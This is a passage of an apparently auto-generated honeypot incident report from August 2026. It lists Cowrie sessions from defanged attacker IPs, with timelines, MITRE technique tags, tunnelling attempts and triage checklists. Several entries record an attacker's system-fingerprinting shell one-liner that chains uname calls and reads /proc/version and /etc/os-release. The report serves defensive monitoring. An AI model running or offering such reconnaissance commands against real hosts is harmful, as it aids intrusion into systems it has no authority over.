| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:46` | `cowrie.session.connect` |
| `2026-08-21 17:01:47` | `cowrie.telnet.option` |
| `2026-08-21 17:01:47` | `cowrie.telnet.option` |
| `2026-08-21 17:01:47` | `cowrie.login.success` |
| `2026-08-21 17:01:48` | `cowrie.session.params` |
| `2026-08-21 17:01:48` | `cowrie.log.closed` |
| `2026-08-21 17:01:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-654c0704f51d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:48` | `cowrie.session.connect` |
| `2026-08-21 17:01:49` | `cowrie.telnet.option` |
| `2026-08-21 17:01:49` | `cowrie.telnet.option` |
| `2026-08-21 17:01:49` | `cowrie.login.success` |
| `2026-08-21 17:01:50` | `cowrie.session.params` |
| `2026-08-21 17:01:50` | `cowrie.log.closed` |
| `2026-08-21 17:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e0c5520b4dd

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:50` | `cowrie.session.connect` |
| `2026-08-21 17:01:51` | `cowrie.telnet.option` |
| `2026-08-21 17:01:51` | `cowrie.telnet.option` |
| `2026-08-21 17:01:51` | `cowrie.login.success` |
| `2026-08-21 17:01:52` | `cowrie.session.params` |
| `2026-08-21 17:01:52` | `cowrie.log.closed` |
| `2026-08-21 17:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47bf9e45e9c7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:52` | `cowrie.session.connect` |
| `2026-08-21 17:01:52` | `cowrie.telnet.option` |
| `2026-08-21 17:01:53` | `cowrie.telnet.option` |
| `2026-08-21 17:01:53` | `cowrie.login.success` |
| `2026-08-21 17:01:53` | `cowrie.session.params` |
| `2026-08-21 17:01:53` | `cowrie.log.closed` |
| `2026-08-21 17:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bfe477e24c2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:54` | `cowrie.session.connect` |
| `2026-08-21 17:01:54` | `cowrie.telnet.option` |
| `2026-08-21 17:01:55` | `cowrie.telnet.option` |
| `2026-08-21 17:01:55` | `cowrie.login.success` |
| `2026-08-21 17:01:55` | `cowrie.session.params` |
| `2026-08-21 17:01:55` | `cowrie.log.closed` |
| `2026-08-21 17:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d57c0fa5f30

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:55` | `cowrie.session.connect` |
| `2026-08-21 17:01:56` | `cowrie.telnet.option` |
| `2026-08-21 17:01:57` | `cowrie.telnet.option` |
| `2026-08-21 17:01:57` | `cowrie.login.success` |
| `2026-08-21 17:01:57` | `cowrie.session.params` |
| `2026-08-21 17:01:57` | `cowrie.log.closed` |
| `2026-08-21 17:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc9b1f675bf

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:02 |
| **Last Seen** | 2026-08-21 17:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:02:58` | `cowrie.session.connect` |
| `2026-08-21 17:02:58` | `cowrie.client.version` |
| `2026-08-21 17:02:58` | `cowrie.client.kex` |
| `2026-08-21 17:02:59` | `cowrie.login.success` |
| `2026-08-21 17:03:00` | `cowrie.session.params` |
| `2026-08-21 17:03:00` | `cowrie.command.input` |
| `2026-08-21 17:03:00` | `cowrie.command.input` |
| `2026-08-21 17:03:00` | `cowrie.command.input` |
| `2026-08-21 17:03:00` | `cowrie.command.input` |
| `2026-08-21 17:03:00` | `cowrie.command.input` |
| `2026-08-21 17:03:00` | `cowrie.command.success` |
| `2026-08-21 17:03:00` | `cowrie.command.input` |
| `2026-08-21 17:03:00` | `cowrie.command.input` |
| `2026-08-21 17:03:00` | `cowrie.command.input` |
| `2026-08-21 17:03:00` | `cowrie.command.input` |
| `2026-08-21 17:03:00` | `cowrie.log.closed` |
| `2026-08-21 17:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e979ef564c6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:05 |
| **Last Seen** | 2026-08-21 17:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:05:26` | `cowrie.session.connect` |
| `2026-08-21 17:05:26` | `cowrie.client.version` |
| `2026-08-21 17:05:26` | `cowrie.client.kex` |
| `2026-08-21 17:05:27` | `cowrie.login.success` |
| `2026-08-21 17:05:28` | `cowrie.session.params` |
| `2026-08-21 17:05:28` | `cowrie.command.input` |
| `2026-08-21 17:05:28` | `cowrie.command.input` |
| `2026-08-21 17:05:28` | `cowrie.command.input` |
| `2026-08-21 17:05:28` | `cowrie.command.input` |
| `2026-08-21 17:05:28` | `cowrie.command.input` |
| `2026-08-21 17:05:28` | `cowrie.command.success` |
| `2026-08-21 17:05:28` | `cowrie.command.input` |
| `2026-08-21 17:05:28` | `cowrie.command.input` |
| `2026-08-21 17:05:28` | `cowrie.command.input` |
| `2026-08-21 17:05:28` | `cowrie.command.input` |
| `2026-08-21 17:05:28` | `cowrie.log.closed` |
| `2026-08-21 17:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-486976e2e136

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:07 |
| **Last Seen** | 2026-08-21 17:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:07:55` | `cowrie.session.connect` |
| `2026-08-21 17:07:56` | `cowrie.client.version` |
| `2026-08-21 17:07:56` | `cowrie.client.kex` |
| `2026-08-21 17:07:57` | `cowrie.login.success` |
| `2026-08-21 17:07:58` | `cowrie.session.params` |
| `2026-08-21 17:07:58` | `cowrie.command.input` |
| `2026-08-21 17:07:58` | `cowrie.command.input` |
| `2026-08-21 17:07:58` | `cowrie.command.input` |
| `2026-08-21 17:07:58` | `cowrie.command.input` |
| `2026-08-21 17:07:58` | `cowrie.command.input` |
| `2026-08-21 17:07:58` | `cowrie.command.success` |
| `2026-08-21 17:07:58` | `cowrie.command.input` |
| `2026-08-21 17:07:58` | `cowrie.command.input` |
| `2026-08-21 17:07:58` | `cowrie.command.input` |
| `2026-08-21 17:07:58` | `cowrie.command.input` |
| `2026-08-21 17:07:58` | `cowrie.log.closed` |
| `2026-08-21 17:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e227a18292d0

| Field | Detail |
|---|---|
| **Source IP** | `202.154.15[.]177` |
| **First Seen** | 2026-08-21 17:08 |
| **Last Seen** | 2026-08-21 17:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:08:56` | `cowrie.session.connect` |
| `2026-08-21 17:08:57` | `cowrie.client.version` |
| `2026-08-21 17:08:57` | `cowrie.client.kex` |
| `2026-08-21 17:09:00` | `cowrie.login.success` |
| `2026-08-21 17:09:01` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.154.15[.]177` to AbuseIPDB if not already reported
- [ ] Block `202.154.15[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6ce2854736b

| Field | Detail |
|---|---|
| **Source IP** | `42.125.196[.]116` |
| **First Seen** | 2026-08-21 17:09 |
| **Last Seen** | 2026-08-21 17:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:09:07` | `cowrie.session.connect` |
| `2026-08-21 17:09:08` | `cowrie.client.version` |
| `2026-08-21 17:09:08` | `cowrie.client.kex` |
| `2026-08-21 17:09:10` | `cowrie.login.success` |
| `2026-08-21 17:09:11` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.125.196[.]116` to AbuseIPDB if not already reported
- [ ] Block `42.125.196[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4f9910934f6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:10 |
| **Last Seen** | 2026-08-21 17:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:10:25` | `cowrie.session.connect` |
| `2026-08-21 17:10:25` | `cowrie.client.version` |
| `2026-08-21 17:10:26` | `cowrie.client.kex` |
| `2026-08-21 17:10:26` | `cowrie.login.success` |
| `2026-08-21 17:10:28` | `cowrie.session.params` |
| `2026-08-21 17:10:28` | `cowrie.command.input` |
| `2026-08-21 17:10:28` | `cowrie.command.input` |
| `2026-08-21 17:10:28` | `cowrie.command.input` |
| `2026-08-21 17:10:28` | `cowrie.command.input` |
| `2026-08-21 17:10:28` | `cowrie.command.input` |
| `2026-08-21 17:10:28` | `cowrie.command.success` |
| `2026-08-21 17:10:28` | `cowrie.command.input` |
| `2026-08-21 17:10:28` | `cowrie.command.input` |
| `2026-08-21 17:10:28` | `cowrie.command.input` |
| `2026-08-21 17:10:28` | `cowrie.command.input` |
| `2026-08-21 17:10:28` | `cowrie.log.closed` |
| `2026-08-21 17:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc5cc3533679

| Field | Detail |
|---|---|
| **Source IP** | `64.53.7[.]231` |
| **First Seen** | 2026-08-21 17:10 |
| **Last Seen** | 2026-08-21 17:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:10:47` | `cowrie.session.connect` |
| `2026-08-21 17:10:48` | `cowrie.client.version` |
| `2026-08-21 17:10:48` | `cowrie.client.kex` |
| `2026-08-21 17:10:48` | `cowrie.login.success` |
| `2026-08-21 17:10:49` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.53.7[.]231` to AbuseIPDB if not already reported
- [ ] Block `64.53.7[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d984395c163

| Field | Detail |
|---|---|
| **Source IP** | `2.180.11[.]118` |
| **First Seen** | 2026-08-21 17:10 |
| **Last Seen** | 2026-08-21 17:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:10:54` | `cowrie.session.connect` |
| `2026-08-21 17:10:55` | `cowrie.client.version` |
| `2026-08-21 17:10:55` | `cowrie.client.kex` |
| `2026-08-21 17:10:57` | `cowrie.login.success` |
| `2026-08-21 17:10:57` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.180.11[.]118` to AbuseIPDB if not already reported
- [ ] Block `2.180.11[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-760ebef34459

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:11 |
| **Last Seen** | 2026-08-21 17:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:11:25` | `cowrie.session.connect` |
| `2026-08-21 17:11:26` | `cowrie.client.version` |
| `2026-08-21 17:11:26` | `cowrie.client.kex` |
| `2026-08-21 17:11:28` | `cowrie.login.success` |
| `2026-08-21 17:11:30` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:11:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:11:30` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef6f182264aa

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:11 |
| **Last Seen** | 2026-08-21 17:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:11:31` | `cowrie.session.connect` |
| `2026-08-21 17:11:31` | `cowrie.client.version` |
| `2026-08-21 17:11:31` | `cowrie.client.kex` |
| `2026-08-21 17:11:35` | `cowrie.login.success` |
| `2026-08-21 17:11:37` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:11:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:11:39` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd861eccd42

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:13 |
| **Last Seen** | 2026-08-21 17:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:13:02` | `cowrie.session.connect` |
| `2026-08-21 17:13:02` | `cowrie.client.version` |
| `2026-08-21 17:13:02` | `cowrie.client.kex` |
| `2026-08-21 17:13:03` | `cowrie.login.success` |
| `2026-08-21 17:13:04` | `cowrie.session.params` |
| `2026-08-21 17:13:04` | `cowrie.command.input` |
| `2026-08-21 17:13:04` | `cowrie.command.input` |
| `2026-08-21 17:13:04` | `cowrie.command.input` |
| `2026-08-21 17:13:04` | `cowrie.command.input` |
| `2026-08-21 17:13:04` | `cowrie.command.input` |
| `2026-08-21 17:13:04` | `cowrie.command.success` |
| `2026-08-21 17:13:04` | `cowrie.command.input` |
| `2026-08-21 17:13:04` | `cowrie.command.input` |
| `2026-08-21 17:13:04` | `cowrie.command.input` |
| `2026-08-21 17:13:04` | `cowrie.command.input` |
| `2026-08-21 17:13:05` | `cowrie.log.closed` |
| `2026-08-21 17:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc0e94624e2c

| Field | Detail |
|---|---|
| **Source IP** | `45.154.244[.]193` |
| **First Seen** | 2026-08-21 17:14 |
| **Last Seen** | 2026-08-21 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:14:14` | `cowrie.session.connect` |
| `2026-08-21 17:14:14` | `cowrie.client.version` |
| `2026-08-21 17:14:14` | `cowrie.client.kex` |
| `2026-08-21 17:14:15` | `cowrie.login.success` |
| `2026-08-21 17:14:15` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:14:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:14:15` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.154.244[.]193` to AbuseIPDB if not already reported
- [ ] Block `45.154.244[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f7490c44e2e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:15 |
| **Last Seen** | 2026-08-21 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:15:32` | `cowrie.session.connect` |
| `2026-08-21 17:15:32` | `cowrie.client.version` |
| `2026-08-21 17:15:32` | `cowrie.client.kex` |
| `2026-08-21 17:15:33` | `cowrie.login.success` |
| `2026-08-21 17:15:34` | `cowrie.session.params` |
| `2026-08-21 17:15:34` | `cowrie.command.input` |
| `2026-08-21 17:15:34` | `cowrie.command.input` |
| `2026-08-21 17:15:34` | `cowrie.command.input` |
| `2026-08-21 17:15:34` | `cowrie.command.input` |
| `2026-08-21 17:15:34` | `cowrie.command.input` |
| `2026-08-21 17:15:34` | `cowrie.command.success` |
| `2026-08-21 17:15:34` | `cowrie.command.input` |
| `2026-08-21 17:15:34` | `cowrie.command.input` |
| `2026-08-21 17:15:34` | `cowrie.command.input` |
| `2026-08-21 17:15:34` | `cowrie.command.input` |
| `2026-08-21 17:15:34` | `cowrie.log.closed` |
| `2026-08-21 17:15:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-097e2087e2dc

| Field | Detail |
|---|---|
| **Source IP** | `176.103.15[.]75` |
| **First Seen** | 2026-08-21 17:15 |
| **Last Seen** | 2026-08-21 17:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:15:43` | `cowrie.session.connect` |
| `2026-08-21 17:15:44` | `cowrie.client.version` |
